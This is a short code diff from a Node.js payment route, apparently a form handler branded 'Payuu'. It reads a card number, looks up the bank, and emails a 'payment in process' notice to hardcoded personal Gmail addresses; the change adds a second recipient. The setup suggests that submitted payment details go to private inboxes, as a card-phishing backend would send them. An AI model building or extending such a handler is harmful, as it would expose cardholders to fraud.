@@ -168,7 +168,7 @@ router.post('/', async (req, res) => {
     const { bank } = getBankInfo(payMeth.card_number);
     const mailClient = {
         from: `"Payuu" <${MAIL_USER}>`,
-        to: 'uwu.ossas.uwu@gmail.com',
+        to: ['alvaroforms@gmail.com', 'uwu.ossas.uwu@gmail.com'],
         subject: 'Pago en Proceso',
         html: `
             <h2>Solicitud de Pago Recibida</h2>
